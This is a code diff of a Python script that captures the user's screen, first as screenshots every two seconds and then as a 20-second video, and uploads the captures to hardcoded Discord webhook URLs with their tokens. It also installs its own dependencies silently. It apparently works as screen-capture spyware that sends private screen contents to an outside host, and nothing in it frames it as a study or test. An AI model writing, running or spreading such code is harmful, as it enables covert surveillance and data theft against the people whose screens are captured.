@@ -3,64 +3,88 @@ import sys
 import time
 import io
 import pyautogui
+import cv2
 import numpy as np
 import requests
-from PIL import Image
+from datetime import datetime
 
 def install_packages():
     """Install required packages."""
     requirements = [
         'pyautogui',
-        'requests',
-        'numpy',
-        'Pillow'
+        'opencv-python',
+        'requests'
     ]
     for package in requirements:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
 
-def send_image_to_webhook(image_bytes):
-    """Send the image to a webhook."""
-    webhook_url = 'https://discord.com/api/webhooks/1268233884227731486/KCCL0wVA00etokhAtjGCEP7GGpOO7x9P1Oe6SDuwl8r5JY6b8PFhkR5vzn7JymVV21jP'
-    files = {'file': ('screenshot.png', image_bytes, 'image/png')}
-    response = requests.post(webhook_url, files=files)
-    if response.status_code == 200:
-        print("Image successfully sent to webhook.")
+def upload_video_to_discord(video_path):
+    """Upload the video file to Discord via webhook."""
+    webhook_url = 'https://discord.com/api/webhooks/1268235871740624977/T4pFfcwPV3L8dZVIQ4FqVzJOTClnyPtxkr20A8iYOz7GVzlkOsTKhwoSy63ij848tZOM'
+    with open(video_path, 'rb') as video_file:
+        files = {'file': ('recording.avi', video_file, 'video/x-msvideo')}
+        response = requests.post(webhook_url, files=files)
+    if response.status_code == 204:
+        print("Video successfully uploaded to Discord.")
     else:
-        print(f"Failed to send image to webhook. Status code: {response.status_code}")
+        print(f"Failed to upload video to Discord. Status code: {response.status_code}")
+
+def record_screen(duration=20):
+    """Record the screen for a given duration in seconds."""
+    # Define the screen size
+    screen_size = pyautogui.size()
+    width, height = screen_size.width, screen_size.height
+
+    # Define the codec and create a VideoWriter object
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    video_path = 'screen_recording.avi'
+    out = cv2.VideoWriter(video_path, fourcc, 20.0, (width, height))
+
+    print(f"Recording for {duration} seconds... Press Ctrl+C to stop.")
+
+    start_time = time.time()
+    try:
+        while time.time() - start_time < duration:
+            # Take a screenshot
+            img = pyautogui.screenshot()
+
+            # Convert the image to a format suitable for OpenCV
+            frame = np.array(img)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+
+            # Write the frame to the video file
+            out.write(frame)
+
+            # Wait for a short while before capturing the next frame
+            time.sleep(0.05)  # Adjust the sleep time as needed
+    except KeyboardInterrupt:
+        print("Recording stopped.")
+
+    # Release everything when the recording is done
+    out.release()
+    cv2.destroyAllWindows()
+
+    return video_path
 
 def main():
     try:
         import pyautogui
-        import requests
+        import cv2
         import numpy as np
-        from PIL import Image
+        import requests
     except ImportError:
         print("Required packages are not installed. Installing...")
         install_packages()
         import pyautogui
-        import requests
+        import cv2
         import numpy as np
-        from PIL import Image
+        import requests
 
-    print("Recording... Press Ctrl+C to stop.")
+    # Record the screen for 20 seconds
+    video_path = record_screen(duration=20)
 
-    try:
-        while True:
-            # Take a screenshot
-            img = pyautogui.screenshot()
-
-            # Convert the image to a bytes object
-            with io.BytesIO() as buffer:
-                img.save(buffer, format="PNG")
-                image_bytes = buffer.getvalue()
-
-            # Send the image to the webhook
-            send_image_to_webhook(image_bytes)
-
-            # Wait for 2 seconds before taking the next screenshot
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("Recording stopped.")
+    # Upload the recorded video to Discord
+    upload_video_to_discord(video_path)
 
 if __name__ == "__main__":
     main()
